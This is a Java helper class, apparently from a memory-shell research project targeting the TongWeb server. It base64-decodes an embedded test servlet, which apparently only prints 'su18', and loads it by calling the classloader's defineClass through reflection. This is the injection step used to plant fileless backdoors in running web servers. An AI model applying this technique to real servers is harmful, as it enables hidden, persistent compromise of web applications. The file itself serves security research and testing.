package org.su18.memshell.test.tongweb;

import sun.misc.BASE64Decoder;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

/**
 * @author su18
 */
public class DynamicUtils {

	public static String SERVLET_CLASS_STRING = "yv66vgAAADQANAoABgAjCwAkACUIACYKACcAKAcAKQcAKgcAKwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQArTG9yZy9zdTE4L21lbXNoZWxsL3Rlc3QvdG9tY2F0L1Rlc3RTZXJ2bGV0OwEABGluaXQBACAoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbmZpZzspVgEADXNlcnZsZXRDb25maWcBAB1MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEACkV4Y2VwdGlvbnMHACwBABBnZXRTZXJ2bGV0Q29uZmlnAQAfKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29uZmlnOwEAB3NlcnZpY2UBAEAoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOylWAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7BwAtAQAOZ2V0U2VydmxldEluZm8BABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQAQVGVzdFNlcnZsZXQuamF2YQwACAAJBwAuDAAvADABAARzdTE4BwAxDAAyADMBAClvcmcvc3UxOC9tZW1zaGVsbC90ZXN0L3RvbWNhdC9UZXN0U2VydmxldAEAEGphdmEvbGFuZy9PYmplY3QBABVqYXZheC9zZXJ2bGV0L1NlcnZsZXQBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAdamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAE2phdmEvaW8vUHJpbnRXcml0ZXIBAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAEABwAAAAYAAQAIAAkAAQAKAAAALwABAAEAAAAFKrcAAbEAAAACAAsAAAAGAAEAAAAJAAwAAAAMAAEAAAAFAA0ADgAAAAEADwAQAAIACgAAADUAAAACAAAAAbEAAAACAAsAAAAGAAEAAAAOAAwAAAAWAAIAAAABAA0ADgAAAAAAAQARABIAAQATAAAABAABABQAAQAVABYAAQAKAAAALAABAAEAAAACAbAAAAACAAsAAAAGAAEAAAASAAwAAAAMAAEAAAACAA0ADgAAAAEAFwAYAAIACgAAAE4AAgADAAAADCy5AAIBABIDtgAEsQAAAAIACwAAAAoAAgAAABcACwAYAAwAAAAgAAMAAAAMAA0ADgAAAAAADAAZABoAAQAAAAwAGwAcAAIAEwAAAAYAAgAUAB0AAQAeAB8AAQAKAAAALAABAAEAAAACAbAAAAACAAsAAAAGAAEAAAAcAAwAAAAMAAEAAAACAA0ADgAAAAEAIAAJAAEACgAAACsAAAABAAAAAbEAAAACAAsAAAAGAAEAAAAiAAwAAAAMAAEAAAABAA0ADgAAAAEAIQAAAAIAIg==";

	public static Class<?> getClass(String classCode) throws IOException, InvocationTargetException, IllegalAccessException, NoSuchMethodException, InstantiationException {
		ClassLoader   loader        = Thread.currentThread().getContextClassLoader();
		BASE64Decoder base64Decoder = new BASE64Decoder();
		byte[]        bytes         = base64Decoder.decodeBuffer(classCode);

		Method   method = null;
		Class<?> clz    = loader.getClass();
		while (method == null && clz != Object.class) {
			try {
				method = clz.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
			} catch (NoSuchMethodException ex) {
				clz = clz.getSuperclass();
			}
		}

		if (method != null) {
			method.setAccessible(true);
			return (Class<?>) method.invoke(loader, bytes, 0, bytes.length);
		}

		return null;

	}

}
